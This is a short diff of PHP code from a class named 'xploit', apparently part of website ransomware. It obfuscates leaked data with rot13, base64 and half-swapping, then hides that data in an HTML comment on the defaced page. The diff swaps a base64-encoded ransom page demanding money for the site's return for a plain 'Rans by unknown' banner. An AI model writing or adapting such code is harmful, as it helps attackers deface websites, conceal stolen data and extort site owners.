@@ -12,7 +12,7 @@ class xploit
             $leak = base64_encode(str_rot13($leak));
             $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
         }
-            $pesan  = base64_decode("PD9waHANCi8vIFJhbnNvbXdhcmUgd2FzIGhlcmUhIQ0KDQplY2hvICI8IWRvY3R5cGUgaHRtbD48aHRtbD48aGVhZD48dGl0bGU+UmFuc29td2FyZSBieSBjeWJvcmcgeHBsb2l0PC90aXRsZT48L2hlYWQ+PHN0eWxlPmJvZHl7IGJhY2tncm91bmQ6IzAwMDsgY29sb3I6IzAwZmYwMDsgdGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbi10b3A6NSU7fSBweyBmb250LXNpemU6MnZ3OyBtYXJnaW46MCAxMHB4O308L3N0eWxlPjxib2R5PjxwPldoMDBweiB5b3VyIHNlY3VyaXR5IGdldCBkb3duISEhPC9wPjxwPkdpdmUgbWUgbW9uZXkgd29ydGggMSB0cmlsbGlvbiBpZiB5b3Ugd2FudCB0aGUgd2Vic2l0ZSB0byBleGlzdCBhZ2Fpbi48L3A+IjsNCg0KPz4=");
+            $pesan  = "<h1>Rans by unknown</h1>";
             $leak   = "<!--#We are party at your security#".$leak."--> <title>Yowaimo</title> <em>".$pesan."</em>";
         return $leak;
     }
